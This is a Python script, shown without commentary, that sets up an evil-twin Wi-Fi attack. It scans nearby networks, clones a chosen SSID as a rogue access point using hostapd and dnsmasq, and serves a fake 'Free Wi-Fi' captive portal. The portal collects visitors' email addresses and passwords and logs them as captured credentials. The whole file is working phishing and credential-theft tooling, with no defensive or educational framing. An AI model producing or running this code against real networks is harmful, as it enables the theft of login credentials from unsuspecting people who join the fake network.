import os
import subprocess
import time
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

# Function to scan for available Wi-Fi networks
def scan_wifi():
    print("[*] Scanning for available Wi-Fi networks...")
    result = subprocess.run(["iwlist", "wlan0", "scan"], capture_output=True, text=True)
    networks = []
    for line in result.stdout.splitlines():
        if "ESSID" in line:
            ssid = line.split('"')[1]
            networks.append(ssid)
    return networks

# Function to set up a rogue access point
def setup_rogue_ap(ssid):
    print(f"[*] Setting up rogue access point for SSID: {ssid}")
    with open("/etc/hostapd/hostapd.conf", "w") as f:
        f.write(f"interface=wlan0\n")
        f.write(f"driver=nl80211\n")
        f.write(f"ssid={ssid}\n")
        f.write(f"hw_mode=g\n")
        f.write(f"channel=6\n")
        f.write(f"auth_algs=1\n")
        f.write(f"wpa=2\n")
        f.write(f"wpa_passphrase=password123\n")
        f.write(f"wpa_key_mgmt=WPA-PSK\n")
        f.write(f"rsn_pairwise=CCMP\n")

    subprocess.run(["systemctl", "stop", "NetworkManager"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["hostapd", "/etc/hostapd/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Function to set up DNS and DHCP
def setup_dns_dhcp():
    print("[*] Setting up DNS and DHCP...")
    with open("/etc/dnsmasq.conf", "w") as f:
        f.write("interface=wlan0\n")
        f.write("dhcp-range=192.168.1.10,192.168.1.100,12h\n")
        f.write("dhcp-option=3,192.168.1.1\n")
        f.write("dhcp-option=6,192.168.1.1\n")
        f.write("server=8.8.8.8\n")

    subprocess.run(["dnsmasq", "--conf-file=/etc/dnsmasq.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Captive Portal Flask App
@app.route("/", methods=["GET", "POST"])
def captive_portal():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        print(f"[*] Captured credentials - Email: {email}, Password: {password}")
        return "Thank you for connecting!"
    return render_template_string('''
        <h1>Welcome to Free Wi-Fi</h1>
        <form method="POST">
            Email: <input type="text" name="email"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Connect">
        </form>
    ''')

def main():
    # Step 1: Scan for available Wi-Fi networks
    networks = scan_wifi()
    print("[*] Available Wi-Fi networks:")
    for i, ssid in enumerate(networks):
        print(f"{i + 1}. {ssid}")

    # Step 2: Select a network to mimic
    selected = input("[*] Enter the number of the network you want to mimic: ")
    selected_ssid = networks[int(selected) - 1]

    # Step 3: Set up rogue access point
    setup_rogue_ap(selected_ssid)

    # Step 4: Set up DNS and DHCP
    setup_dns_dhcp()

    # Step 5: Start the captive portal
    print("[*] Starting captive portal...")
    app.run(host="192.168.1.1", port=80)

if __name__ == "__main__":
    main()
